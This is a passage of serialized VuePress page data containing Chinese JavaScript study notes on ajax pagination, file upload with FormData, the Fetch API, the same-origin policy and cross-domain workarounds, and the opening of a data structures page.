假设ajax要请求一条长度10000的数据并渲染,首先由于数据量大ajax请求花费事件会很长,并且前台在处理该数据时也会花费大量事件导致页面长时间留白。所以在请求大规模数据时有以下几种处理方法：\n\n\n# 1. 数据分页\n\n将大量的数据进行分页展示，每次只获取当前页的数据，则数据的请求和处理会更快。\n\n所以在发送ajax请求时就需要携带分页的参数，一个分页器一般包含数据总条数、总页数、当前页码、每页数据条数等数据。其中当前页码、每页条数需要在发送请求时携带，每当切换页码时重新携带当前页码和每页条数发送请求。\n\n而后台需要返回当前页数据，以及数据总条数，前台即可根据数据总条数及每页数据条数计算出总页数进行页面渲染。\n\nvar currentpage = 2,   // 当前页码\n    pagesize = 20;     // 每页数据条数   \najax({\n    url: "",\n    data:{\n        currentpage,  \n        pagesize,   \n    },\n    success(data){\n        var pagecount = math.ceil(data.total / pagesize)   // 总数据条数total / 每页数据数pagesize   向上取整，即可求出总页数pagecount\n    }\n})\n\n\n\n# 2. 分批次请求\n\n当前台不能进行分页时，大规模数据的请求可采用分批次的请求。如10000条数据，第一次请求100条数据（这样用户就很快看到有页面出来），剩余的数据，通过ajax分多次请求给客户端。（这里相当于：用户的一个请求结果，被切割成多次请求来完成）\n\n例如先展示100条数据，剩余数据按需(上拉或者触底)加载\n\n\n# 文件上传\n\n\n# 1. form文件上传\n\n> 上传图片必须为post方式，并且设置编码方式enctype="multipart/form-data"，否则会默认对文件进行编码则无法使用\n> enctype这个属性管理的是表单的mime编码，有三个值，默认为application/x-www-form-urlencoded，是传递html代码的编码类型。text/plain,是纯文本传输的意思。multipart/form-data,是用来指定传输数据的特殊类型的，主要就是我们上传的非文本的内容，比如图片或者mp3等等。\n\n<form action="" method="post" enctype="multipart/form-data">\n    <input type="file" name="file">\n</form>\n\n\n\n# 2. ajax上传文件\n\n> ajax上传文件需要依靠表单对象formdata，在表单对象中添加数据进行上传\n\n表单对象formdata的作用\n\n * 将form表单元素的name与value进行组合，实现表单数据的序列化，从而减少表单元素的拼接，提高工作效率。\n * 异步上传文件\n   兼容性：chrome 7+、firefox 4+、ie 10+、opera 12+、safari 5+。\n\n# formdata对象\n\n实例化formdata，来得到这个对象\n\n参数为form，一个html表单元素，可以包含任何形式的表单控件，包括文件输入框，是一个可选参数\n\nvar formdata = new formdata();   \n\n\n通过html表单创建formdata对象\n\nvar formdata = new formdata(document.queryselector("form"));   //包含了form表单里的数据\n\n\n# 方法\n\n * 通过append(name,value,filename)在数据末尾追加数据，参数值有三个,第三个为可选参数\n\nformdata.append("name","laoliu");   //通过append()方法在末尾追加key为name值为laoliu的数据\n\n\n * 通过get(name)来获取相对应的值\n\n// 获取key为age的值\nformdata.get("age");\n\n\n * 通过set(key, value)来设置修改数据（key的值不存在，会添加一条数据）\n\nformdata.set("name","laoli");     \n\n\n * 通过has(key)来判断是否存在对应的key值 返回一个布尔值\n\nformdata.has("name")     \n\n\n * 通过delete(key)可以删除数据\n\n//删除key为name的值\nformdata.delete("name");\n\n\n# ajax+formdata对象上传文件\n\nvar filetag = document.queryselector("input[type=file]");\n file.onchange=function(){\n    // 图片会保存到 标签的files属性中，并且可读取文件的名称、大小等信息\n    var fd = new formdata();\n    // 添加图片，字段名叫 files\n    fd.append(\'files\', filetag.files[0]);\n    // 添加普通字段\n    fd.append("user", "zhangsan");\n    fd.append("age", 22); //数字22会被立即转换成字符串 "22"\n    // ...ajax代码\n    xhr.send(fd)\n    // ...ajax代码\n }\n\n\n\n# 轮询\n\n> 原理： 每隔一段时间执行ajax请求，获取实时数据\n\n例：访问实时金价、实时停车等数据\n\n实现方式：在时间函数setinterval中进行ajax请求',charsets:{cjk:!0}},{title:"Fetch",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Fetch.html",relativePath:"Javascript/Javascript数据处理/Fetch.md",key:"v-cae50b74",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Fetch.html",headers:[{level:3,title:"npm 命令行安装：",slug:"npm-命令行安装",normalizedTitle:"npm 命令行安装：",charIndex:503},{level:3,title:"ie重新封装fetch",slug:"ie重新封装fetch",normalizedTitle:"ie重新封装fetch",charIndex:745},{level:2,title:"使用方式",slug:"使用方式",normalizedTitle:"使用方式",charIndex:761},{level:3,title:"参数说明：",slug:"参数说明",normalizedTitle:"参数说明：",charIndex:959},{level:3,title:"返回值：",slug:"返回值",normalizedTitle:"返回值：",charIndex:1299},{level:3,title:"设置请求头信息",slug:"设置请求头信息",normalizedTitle:"设置请求头信息",charIndex:1918},{level:3,title:"携带cookie",slug:"携带cookie",normalizedTitle:"携带cookie",charIndex:2620},{level:3,title:"错误处理",slug:"错误处理",normalizedTitle:"错误处理",charIndex:2974},{level:3,title:"文件上传：",slug:"文件上传",normalizedTitle:"文件上传：",charIndex:3536},{level:3,title:"fetch 封装",slug:"fetch-封装",normalizedTitle:"fetch 封装",charIndex:4440}],headersStr:"npm 命令行安装： ie重新封装fetch 使用方式 参数说明： 返回值： 设置请求头信息 携带cookie 错误处理 文件上传： fetch 封装",content:"# Fetch\n\n> 在开发过程中, 我们向服务端发送请求, 一般会使用三种方式, XMLHttpRequest(XHR) 、 Fetch 、 jQuery实现的AJAX 。\n\n 1. XMLHttpRequest 不符合关注分离, 配置和调用方式比较混乱，还需要兼容于多层回调\n 2. jQuery实现的AJAX 兼容性和易用性方面都做了很大的提高，并支持jsonp，但仍存在回调地狱\n 3. fetch 是现代浏览器新增的的一种发送请求方式，用以替代ajax\n\nFetch API是基于Promise设计，部分老浏览器不支持fetch，旧浏览器不支持 Promise，需要使用如下兼容可兼容到ie8:\n\n 1. 引入 es6 的 polyfill: babel-polyfill\n 2. 引入 promise 的 polyfill: es6-promise (参考Promise章节)\n 3. 引入 fetch 探测库： fetch-detector\n 4. 引入 fetch 的 polyfill: fetch-ie8\n 5. 可选：如果你还使用了 jsonp，引入 fetch-jsonp\n\n\n# npm 命令行安装：\n\nnpm install babel-polyfill es6-promise fetch-detector fetch-ie8 --save\n\n\njs导入：\n\nimport 'babel-polyfill';\nrequire('es6-promise').polyfill();\nimport 'fetch-detector';\nimport 'fetch-ie8';\n\n\n注意： fetch-detector 一定要在 fetch-ie8 之前引入\n\n\n# ie重新封装fetch\n\n\n# 使用方式\n\nfetch() 接收两个参数 —— 请求资源的路径和配置信息。无论请求成功与否，它都返回一个 promise 对象\n\nfetch(url, options)\n    .then(res => {\n        // handle HTTP response\n    }, error => {\n        // handle network error\n    })\n\n\n\n# 参数说明：\n\n 1. url ：请求资源的路径 (必填)\n 2. options ： 请求配置信息\n\n配置项           数据类型     功能说明\nmethod        String   HTTP请求方法，默认为 GET\nbody          String   HTTP的请求参数\nheaders       Object   HTTP的请求头，默认为{}\ncredentials   String   默认为 omit , 忽略的意思，也就是不带cookie; 还有两个参数， same-origin\n                       ，意思就是同源请求带cookie； include , 表示无论跨域还是同源请求都会带cookie\n\n\n# 返回值：\n\n第一个 then 函数里面处理的是 response 的格式，这里的 response 具体如下：\n\n\n\n 1. status(number): HTTP返回的状态码，范围在100-599之间\n 2. statusText(String): 服务器返回的状态文字描述，例如 OK\n 3. ok(Boolean): 如果状态码是以2开头的，则为true\n 4. headers: HTTP请求返回头\n 5. body: 返回体，这里有处理返回体的一些方法\n\n# 返回体的处理 (获取返回的数据)\n\n * text(): 将返回体处理成字符串类型\n * json()： 返回结果和 JSON.parse(responseText)一样\n * blob()： 返回一个Blob，Blob对象是一个不可更改的类文件的二进制数据\n * arrayBuffer()\n * formData()\n\n> 返回体处理的返回值均为Promise对象，所以后面可继续使用 then() 或 catch() 进行调用\n\n// 以处理json数据为例：\nfetch(url, options)\n    .then(res => {\n            return res.json()\n        }\n        .then(data => {\n            console.log(data)\n        })\n\n\n\n# 设置请求头信息\n\n> 在POST提交的过程中，一般是表单提交，可是，经过查询，发现默认的提交方式是： Content-Type:text/plain;charset=UTF-8 ，这个显然是不合理的。\n\n// 通过fetch获取百度的错误提示页面\nfetch('https://www.baidu.com/rec?platform=wise&ms=1&rset=rcmd&word=123&qid=11327900426705455986&rq=123&from=844b&baiduid=A1D0B88941B30028C375C79CE5AC2E5E%3AFG%3D1&tn=&clientWidth=375&t=1506826017369&r=8255', { // 在URL中写上传递的参数\n        method: 'GET',\n        headers: {\n            'Content-Type': 'application/x-www-form-urlencoded', // 指定提交方式为表单提交\n            'Accept': 'application/json' // 通过头指定，获取的数据类型是JSON\n        },\n    })\n    .then((res) => {\n        return res.json() // 返回一个Promise，可以解析成JSON\n    })\n    .then((res) => {\n        console.log(res) // 获取JSON数据\n    })\n\n\n\n# 携带cookie\n\n> 默认情况下, fetch 不会从服务端发送或接收任何 cookies, 如果站点依赖于维护一个用户会话，则导致未经认证的请求(要发送 cookies，必须发送凭据头)\n\n// 通过fetch获取百度的错误提示页面\nfetch('https://www.baidu.com/search/error.html', {\n        method: 'GET',\n        credentials: 'include' // 强制加入凭据头\n    })\n    .then((res) => {\n        return res.json()\n    })\n    .then((res) => {\n        console.log(res)\n    })\n\n\n\n# 错误处理\n\n> fetch在服务器返回 4xx 、 5xx 时是不会抛出错误的，只有网络错误这些导致请求不能完成时，fetch 才会被 reject。这里需要手动通过，通过 response 中的ok字段和 status 字段来判断\n\nfetch('url')\n    .then(res => {\n        if (res.ok) {\n            return res.json()\n        } else {\n            // 抛出异常\n            throw new Error('something went wrong!')\n\n            // 或者rejectPromise来调用catch\n            return Promise.reject({\n                status: res.status,\n                statusText: res.statusText\n            })\n        }\n    })\n    .then(data => console.log(data))\n    .catch(error => console.log(error));\n\n\n\n# 文件上传：\n\nconst input = document.querySelector('input[type=file]');\n\n// This will upload the file after having read it\nconst upload = (file) => {\n    fetch('http://www.example.net', { // Your POST endpoint\n        method: 'POST',\n        headers: {\n            \"Content-Type\": \"You will perhaps need to define a content-type here\"\n        },\n        body: file // This is your file object\n    }).then(\n        response => response.json() // if the response is a JSON object\n    ).then(\n        success => console.log(success) // Handle the success response object\n    ).catch(\n        error => console.log(error) // Handle the error response object\n    );\n};\n\n// Event handler executed when a file is selected\nconst onSelectFile = () => upload(input.files[0]);\n\n// Add a listener on your input\n// It will be triggered when a file will be selected\ninput.addEventListener('change', onSelectFile, false);\n\n\n\n# fetch 封装\n\n> 参考资料： 使用Fetch 参考资料： fetch，终于认识你",normalizedContent:"# fetch\n\n> 在开发过程中, 我们向服务端发送请求, 一般会使用三种方式, xmlhttprequest(xhr) 、 fetch 、 jquery实现的ajax 。\n\n 1. xmlhttprequest 不符合关注分离, 配置和调用方式比较混乱，还需要兼容于多层回调\n 2. jquery实现的ajax 兼容性和易用性方面都做了很大的提高，并支持jsonp，但仍存在回调地狱\n 3. fetch 是现代浏览器新增的的一种发送请求方式，用以替代ajax\n\nfetch api是基于promise设计，部分老浏览器不支持fetch，旧浏览器不支持 promise，需要使用如下兼容可兼容到ie8:\n\n 1. 引入 es6 的 polyfill: babel-polyfill\n 2. 引入 promise 的 polyfill: es6-promise (参考promise章节)\n 3. 引入 fetch 探测库： fetch-detector\n 4. 引入 fetch 的 polyfill: fetch-ie8\n 5. 可选：如果你还使用了 jsonp，引入 fetch-jsonp\n\n\n# npm 命令行安装：\n\nnpm install babel-polyfill es6-promise fetch-detector fetch-ie8 --save\n\n\njs导入：\n\nimport 'babel-polyfill';\nrequire('es6-promise').polyfill();\nimport 'fetch-detector';\nimport 'fetch-ie8';\n\n\n注意： fetch-detector 一定要在 fetch-ie8 之前引入\n\n\n# ie重新封装fetch\n\n\n# 使用方式\n\nfetch() 接收两个参数 —— 请求资源的路径和配置信息。无论请求成功与否，它都返回一个 promise 对象\n\nfetch(url, options)\n    .then(res => {\n        // handle http response\n    }, error => {\n        // handle network error\n    })\n\n\n\n# 参数说明：\n\n 1. url ：请求资源的路径 (必填)\n 2. options ： 请求配置信息\n\n配置项           数据类型     功能说明\nmethod        string   http请求方法，默认为 get\nbody          string   http的请求参数\nheaders       object   http的请求头，默认为{}\ncredentials   string   默认为 omit , 忽略的意思，也就是不带cookie; 还有两个参数， same-origin\n                       ，意思就是同源请求带cookie； include , 表示无论跨域还是同源请求都会带cookie\n\n\n# 返回值：\n\n第一个 then 函数里面处理的是 response 的格式，这里的 response 具体如下：\n\n\n\n 1. status(number): http返回的状态码，范围在100-599之间\n 2. statustext(string): 服务器返回的状态文字描述，例如 ok\n 3. ok(boolean): 如果状态码是以2开头的，则为true\n 4. headers: http请求返回头\n 5. body: 返回体，这里有处理返回体的一些方法\n\n# 返回体的处理 (获取返回的数据)\n\n * text(): 将返回体处理成字符串类型\n * json()： 返回结果和 json.parse(responsetext)一样\n * blob()： 返回一个blob，blob对象是一个不可更改的类文件的二进制数据\n * arraybuffer()\n * formdata()\n\n> 返回体处理的返回值均为promise对象，所以后面可继续使用 then() 或 catch() 进行调用\n\n// 以处理json数据为例：\nfetch(url, options)\n    .then(res => {\n            return res.json()\n        }\n        .then(data => {\n            console.log(data)\n        })\n\n\n\n# 设置请求头信息\n\n> 在post提交的过程中，一般是表单提交，可是，经过查询，发现默认的提交方式是： content-type:text/plain;charset=utf-8 ，这个显然是不合理的。\n\n// 通过fetch获取百度的错误提示页面\nfetch('https://www.baidu.com/rec?platform=wise&ms=1&rset=rcmd&word=123&qid=11327900426705455986&rq=123&from=844b&baiduid=a1d0b88941b30028c375c79ce5ac2e5e%3afg%3d1&tn=&clientwidth=375&t=1506826017369&r=8255', { // 在url中写上传递的参数\n        method: 'get',\n        headers: {\n            'content-type': 'application/x-www-form-urlencoded', // 指定提交方式为表单提交\n            'accept': 'application/json' // 通过头指定，获取的数据类型是json\n        },\n    })\n    .then((res) => {\n        return res.json() // 返回一个promise，可以解析成json\n    })\n    .then((res) => {\n        console.log(res) // 获取json数据\n    })\n\n\n\n# 携带cookie\n\n> 默认情况下, fetch 不会从服务端发送或接收任何 cookies, 如果站点依赖于维护一个用户会话，则导致未经认证的请求(要发送 cookies，必须发送凭据头)\n\n// 通过fetch获取百度的错误提示页面\nfetch('https://www.baidu.com/search/error.html', {\n        method: 'get',\n        credentials: 'include' // 强制加入凭据头\n    })\n    .then((res) => {\n        return res.json()\n    })\n    .then((res) => {\n        console.log(res)\n    })\n\n\n\n# 错误处理\n\n> fetch在服务器返回 4xx 、 5xx 时是不会抛出错误的，只有网络错误这些导致请求不能完成时，fetch 才会被 reject。这里需要手动通过，通过 response 中的ok字段和 status 字段来判断\n\nfetch('url')\n    .then(res => {\n        if (res.ok) {\n            return res.json()\n        } else {\n            // 抛出异常\n            throw new error('something went wrong!')\n\n            // 或者rejectpromise来调用catch\n            return promise.reject({\n                status: res.status,\n                statustext: res.statustext\n            })\n        }\n    })\n    .then(data => console.log(data))\n    .catch(error => console.log(error));\n\n\n\n# 文件上传：\n\nconst input = document.queryselector('input[type=file]');\n\n// this will upload the file after having read it\nconst upload = (file) => {\n    fetch('http://www.example.net', { // your post endpoint\n        method: 'post',\n        headers: {\n            \"content-type\": \"you will perhaps need to define a content-type here\"\n        },\n        body: file // this is your file object\n    }).then(\n        response => response.json() // if the response is a json object\n    ).then(\n        success => console.log(success) // handle the success response object\n    ).catch(\n        error => console.log(error) // handle the error response object\n    );\n};\n\n// event handler executed when a file is selected\nconst onselectfile = () => upload(input.files[0]);\n\n// add a listener on your input\n// it will be triggered when a file will be selected\ninput.addeventlistener('change', onselectfile, false);\n\n\n\n# fetch 封装\n\n> 参考资料： 使用fetch 参考资料： fetch，终于认识你",charsets:{cjk:!0}},{title:"同源策略",frontmatter:{},regularPath:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F.html",relativePath:"Javascript/Javascript数据处理/Ajax/同源策略和跨域.md",key:"v-2f0a7a0c",path:"/Javascript/Javascript%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/Ajax/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F.html",headers:[{level:2,title:"什么是同源",slug:"什么是同源",normalizedTitle:"什么是同源",charIndex:11},{level:3,title:"IE 例外",slug:"ie-例外",normalizedTitle:"ie 例外",charIndex:334},{level:2,title:"同源策略",slug:"同源策略-2",normalizedTitle:"同源策略",charIndex:2},{level:2,title:"跨域限制的必要性",slug:"跨域限制的必要性",normalizedTitle:"跨域限制的必要性",charIndex:507},{level:2,title:"跨域问题的解决办法",slug:"跨域问题的解决办法",normalizedTitle:"跨域问题的解决办法",charIndex:843},{level:3,title:"jsonp（与json并没有什么关系）",slug:"jsonp-与json并没有什么关系",normalizedTitle:"jsonp（与json并没有什么关系）",charIndex:857},{level:3,title:"服务器代理",slug:"服务器代理",normalizedTitle:"服务器代理",charIndex:1131},{level:3,title:"CORS 的实现",slug:"cors-的实现",normalizedTitle:"cors 的实现",charIndex:1259},{level:3,title:"window.name+iframe",slug:"window-name-iframe",normalizedTitle:"window.name+iframe",charIndex:1591},{level:3,title:"window.postMessage(message,targetOrigin)",slug:"window-postmessage-message-targetorigin",normalizedTitle:"window.postmessage(message,targetorigin)",charIndex:1860}],headersStr:"什么是同源 IE 例外 同源策略 跨域限制的必要性 跨域问题的解决办法 jsonp（与json并没有什么关系） 服务器代理 CORS 的实现 window.name+iframe window.postMessage(message,targetOrigin)",content:"# 同源策略\n\n\n# 什么是同源\n\n> 源（origin）是指协议、域名和端口号。若地址里面的协议、域名和端口号均相同则属于同源。三者有一个不相同则代表着不同源\n\n相对于http://www.uek.com/index.html做同源检测：\n\n地址                                   结果\nhttp://www.uek.com/test/a.html       同源\nhttps://www.uek.com/index.html       协议不同\nhttp://www.uekedu.com/index.html     主机名不同\nhttp://www.uek.com:8080/index.html   端口号不同\n\n\n# IE 例外\n\n 1. 两个相互之间高度互信的域名，不遵守同源策略的限制。\n 2. IE 未将端口号加入到同源策略的组成部分之中\n\n\n# 同源策略\n\n> 同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的js脚本采用ajax读取b.com里面的文件数据是会报错的。\n\n\n# 跨域\n\n\n# 跨域限制的必要性\n\n> 上面提到浏览器的同源策略是为了安全。跨域主要存在两方面安全问题\n\n 1. DOM 同源策略\n    我们用一个iframe把银行的网站嵌套在我们的网页上，这样的话，我们的网站和银行的网站除了域名没有其他的区别，如果没有同源策略，用户操作网页，我们就可以通过我们自己的网站跨域来访问银行的dom节点，从而拿到用户的信息。\n 2. XMLHttpRequest 同源策略\n    用户访问银行的网站，银行在用户的客户端中cookie中添加标识。用户再访问恶意网站，如果没有同源策略，恶意网站就会向银行网站发送恶意的ajax请求，请求会把银行给用户cookie中添加的标识发送过去，银行网站识别到正确的cookie返回请求数据，这样数据就会泄漏\n\n\n# 跨域问题的解决办法\n\n\n# jsonp（与json并没有什么关系）\n\n在a.com的html页面里创建一个回调函数fun，动态添加<script>元素，向服务器发送请求，请求地址后面加上查询字符串，通过callback参数指定回调函数的名字。请求地址为http://b.com/main.js?callback=fun。在main.js中调用这个回调函数fun，并且以JSON数据形式作为参数传递，在a.com通过调用fun中接收参数。\n\n> 利用script标签没有跨域限制的特点\n\n# 缺点\n\n 1. 只能使用GET请求\n 2. 不能很好的发现错误，并进行处理。\n\n\n# 服务器代理\n\n服务器端不存在跨域的问题，所以可以用服务器代理的方式来解决跨域问题。\n让自己的服务器去访问另一个服务器，然后再把数据从我们自己的服务器上返回到页面。\nA客户端（浏览器） ==> A服务器 ==> B服务器 ==> A客户端（浏览器）\n\n\n# CORS 的实现\n\n> CORS（跨源资源共享）是一个系统，由传输HTTP标头组成，用于确定浏览器是否阻止前端JavaScript代码访问跨源请求的响应。\n\nAccess-Control-Allow-Origin: http://www.xxx.com      //允许从http://www.xxx.com源请求代码来访问资源。 *代表允许所有的\nAccess-Control-Allow-Methods：PUT,POST,GET,DELETE,OPTIONS       //允许哪些请求方法\nAccess-Control-Allow-Headers：<header-name> [，<header-name> ] *   //请求需要具有的标头\n\n\n\n# window.name+iframe\n\nwindow对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。\n在我们的当前页面中使用一个隐藏的iframe来充当一个中间人角色，由iframe去获取数据页面的数据，并把数据存放到window.name上，然后我们的当前页面再去得到iframe获取到的数据。\n\n\n# window.postMessage(message,targetOrigin)\n\nhtml5新引进的特性，可以使用它来向其它的window对象发送消息，无论这个window对象是属于同源或不同源，目前IE8+、FireFox、Chrome、Opera等浏览器都已经支持window.postMessage方法。\n调用postMessage方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetOrigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符 * 。\n需要接收消息的window对象，可是通过监听自身的message事件来获取传过来的消息，消息内容储存在该事件对象的data属性中。",normalizedContent:"# 同源策略\n\n\n# 什么是同源\n\n> 源（origin）是指协议、域名和端口号。若地址里面的协议、域名和端口号均相同则属于同源。三者有一个不相同则代表着不同源\n\n相对于http://www.uek.com/index.html做同源检测：\n\n地址                                   结果\nhttp://www.uek.com/test/a.html       同源\nhttps://www.uek.com/index.html       协议不同\nhttp://www.uekedu.com/index.html     主机名不同\nhttp://www.uek.com:8080/index.html   端口号不同\n\n\n# ie 例外\n\n 1. 两个相互之间高度互信的域名，不遵守同源策略的限制。\n 2. ie 未将端口号加入到同源策略的组成部分之中\n\n\n# 同源策略\n\n> 同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的js脚本采用ajax读取b.com里面的文件数据是会报错的。\n\n\n# 跨域\n\n\n# 跨域限制的必要性\n\n> 上面提到浏览器的同源策略是为了安全。跨域主要存在两方面安全问题\n\n 1. dom 同源策略\n    我们用一个iframe把银行的网站嵌套在我们的网页上，这样的话，我们的网站和银行的网站除了域名没有其他的区别，如果没有同源策略，用户操作网页，我们就可以通过我们自己的网站跨域来访问银行的dom节点，从而拿到用户的信息。\n 2. xmlhttprequest 同源策略\n    用户访问银行的网站，银行在用户的客户端中cookie中添加标识。用户再访问恶意网站，如果没有同源策略，恶意网站就会向银行网站发送恶意的ajax请求，请求会把银行给用户cookie中添加的标识发送过去，银行网站识别到正确的cookie返回请求数据，这样数据就会泄漏\n\n\n# 跨域问题的解决办法\n\n\n# jsonp（与json并没有什么关系）\n\n在a.com的html页面里创建一个回调函数fun，动态添加<script>元素，向服务器发送请求，请求地址后面加上查询字符串，通过callback参数指定回调函数的名字。请求地址为http://b.com/main.js?callback=fun。在main.js中调用这个回调函数fun，并且以json数据形式作为参数传递，在a.com通过调用fun中接收参数。\n\n> 利用script标签没有跨域限制的特点\n\n# 缺点\n\n 1. 只能使用get请求\n 2. 不能很好的发现错误，并进行处理。\n\n\n# 服务器代理\n\n服务器端不存在跨域的问题，所以可以用服务器代理的方式来解决跨域问题。\n让自己的服务器去访问另一个服务器，然后再把数据从我们自己的服务器上返回到页面。\na客户端（浏览器） ==> a服务器 ==> b服务器 ==> a客户端（浏览器）\n\n\n# cors 的实现\n\n> cors（跨源资源共享）是一个系统，由传输http标头组成，用于确定浏览器是否阻止前端javascript代码访问跨源请求的响应。\n\naccess-control-allow-origin: http://www.xxx.com      //允许从http://www.xxx.com源请求代码来访问资源。 *代表允许所有的\naccess-control-allow-methods：put,post,get,delete,options       //允许哪些请求方法\naccess-control-allow-headers：<header-name> [，<header-name> ] *   //请求需要具有的标头\n\n\n\n# window.name+iframe\n\nwindow对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。\n在我们的当前页面中使用一个隐藏的iframe来充当一个中间人角色，由iframe去获取数据页面的数据，并把数据存放到window.name上，然后我们的当前页面再去得到iframe获取到的数据。\n\n\n# window.postmessage(message,targetorigin)\n\nhtml5新引进的特性，可以使用它来向其它的window对象发送消息，无论这个window对象是属于同源或不同源，目前ie8+、firefox、chrome、opera等浏览器都已经支持window.postmessage方法。\n调用postmessage方法的window对象是指要接收消息的那一个window对象，该方法的第一个参数message为要发送的消息，类型只能为字符串；第二个参数targetorigin用来限定接收消息的那个window对象所在的域，如果不想限定域，可以使用通配符 * 。\n需要接收消息的window对象，可是通过监听自身的message事件来获取传过来的消息，消息内容储存在该事件对象的data属性中。",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95.html",relativePath:"Javascript/Javascript扩展操作/数据结构和算法.md",key:"v-cdcd6a46",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95.html",headers:[{level:2,title:"常见的数据结构",slug:"常见的数据结构",normalizedTitle:"常见的数据结构",charIndex:60},{level:2,title:"数组",slug:"数组",normalizedTitle:"数组",charIndex:72},{level:3,title:"创建和初始化",slug:"创建和初始化",normalizedTitle:"创建和初始化",charIndex:259},{level:3,title:"访问元素和迭代数组",slug:"访问元素和迭代数组",normalizedTitle:"访问元素和迭代数组",charIndex:472},{level:3,title:"添加元素",slug:"添加元素",normalizedTitle:"添加元素",charIndex:615},{level:3,title:"删除元素",slug:"删除元素",normalizedTitle:"删除元素",charIndex:1171},{level:3,title:"任意位置添加或删除元素",slug:"任意位置添加或删除元素",normalizedTitle:"任意位置添加或删除元素",charIndex:1411},{level:2,title:"栈",slug:"栈",normalizedTitle:"栈",charIndex:86},{level:2,title:"算法的特性",slug:"算法的特性",normalizedTitle:"算法的特性",charIndex:1584},{level:2,title:"算法的设计要求",slug:"算法的设计要求",normalizedTitle:"算法的设计要求",charIndex:1725},{level:2,title:"算法的复杂度",slug:"算法的复杂度",normalizedTitle:"算法的复杂度",charIndex:1764},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:1775},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:1781},{level:2,title:"算法性能选择",slug:"算法性能选择",normalizedTitle:"算法性能选择",charIndex:4166},{level:2,title:"排序算法",slug:"排序算法",normalizedTitle:"排序算法",charIndex:4318},{level:2,title:"查找算法",slug:"查找算法",normalizedTitle:"查找算法",charIndex:4463},{level:3,title:"基于线性表的查找法",slug:"基于线性表的查找法",normalizedTitle:"基于线性表的查找法",charIndex:4516},{level:3,title:"基于树的查找法",slug:"基于树的查找法",normalizedTitle:"基于树的查找法",charIndex:5165},{level:3,title:"计算式查找法————哈希法",slug:"计算式查找法-哈希法",normalizedTitle:"计算式查找法————哈希法",charIndex:8219},{level:2,title:"简单算法题",slug:"简单算法题",normalizedTitle:"简单算法题",charIndex:8261}],headersStr:"常见的数据结构 数组 创建和初始化 访问元素和迭代数组 添加元素 删除元素 任意位置添加或删除元素 栈 算法的特性 算法的设计要求 算法的复杂度 时间复杂度 空间复杂度 算法性能选择 排序算法 查找算法 基于线性表的查找法 基于树的查找法 计算式查找法————哈希法 简单算法题",content:'算法+数据结构=程序\n数据结构是底层，算法高层。数据结构为算法提供服务。算法围绕数据结构操作\n\n\n# 数据结构\n\n\n# 常见的数据结构\n\n * 数组（Aarray）\n * 栈（Stack）\n * 链表（Linked List）\n * 图（Graph）\n * 散列表（Hash）\n * 队列（Queue）\n * 树（Tree）\n * 堆（Heap）\n\n\n# 数组\n\n> 几乎所有的编程语言都原生支持数组类型，因为数组是最简单的内存数据结构。JavaScript里也有数组类型，尽管它的第一个版本并没有支持数组。\n\n\n# 创建和初始化\n\nlet daysOfWeek = new Array(); \ndaysOfWeek = new Array(7); \ndaysOfWeek = new Array(\'Sunday\', \'Monday\', \'Tuesday\', \'Wednesday\', \n\'Thursday\', \'Friday\', \'Saturday\'); \n\nconsole.log(daysOfWeek.length); //7\n\n\n\n# 访问元素和迭代数组\n\n> 要访问数组里特定位置的元素，可以用中括号[]传递数值位置，得到想知道的值或者赋新的值。\n\n\nfor (let i = 0; i < daysOfWeek.length; i++) { \n console.log(daysOfWeek[i]); \n}\n\n\n\n# 添加元素\n\n添加到尾部\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers[numbers.length] = 10\n// or\nnumbers.push(1,2,3)\n\n\n添加到开头\n\n> 要腾出数组里第一个元素的位置，把所有的元素向右移动一位。我们可以循环数组中的元素，从最后一位（长度值就是数组的末尾位置）开始，将对应的前 一个元素（i-1）的值赋给它（i），依次处理，最后把我们想要的值赋给第一个位置（索引 0）上。\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nArray.prototype.insertFirstPosition = function(value) { \n for (let i = this.length; i >= 0; i--) { \n this[i] = this[i - 1]; \n } \n this[0] = value; \n}; \nnumbers.insertFirstPosition(-1);\nor\nnumbers.unshift(-4, -3); //（此方法背后的逻辑和 insertFirstPosition 方法的行为是一样的\n\n\n\n\n\n# 删除元素\n\n末尾删除元素\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers.pop();\n\n\n开头删除元素\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nfor (let i = 0; i < numbers.length; i++) { \n numbers[i] = numbers[i + 1]; \n}\nor\nnumbers.shift();\n\n\n\n\n\n\n# 